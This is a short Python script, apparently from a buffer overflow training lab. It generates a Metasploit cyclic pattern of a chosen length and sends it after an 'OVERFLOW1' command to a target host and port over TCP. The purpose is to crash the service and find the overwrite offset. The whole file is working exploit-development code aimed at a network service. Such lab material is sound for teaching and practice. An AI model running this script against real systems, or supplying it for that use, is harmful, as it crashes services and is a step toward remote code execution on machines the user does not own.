#!/usr/bin/python3
import sys, socket, pdb, os


if len(sys.argv) != 4:
    print('Usage: "' + sys.argv[0] + ' 0.0.0.0 21" <buffer size>')
    sys.exit()


target = sys.argv[1]
targetport = int(sys.argv[2])
patternlength = sys.argv[3]

# Generate offset using pattern_create
command = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l " + patternlength
pattern = os.popen(command).read()
pattern = bytes(pattern, 'utf-8')

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target, targetport))
    print("Sending Buffer: " + str(pattern))
    s.send((b'OVERFLOW1 ' + pattern))
    s.close()

except:
    print("Error connecting to server " + target)
    sys.exit()
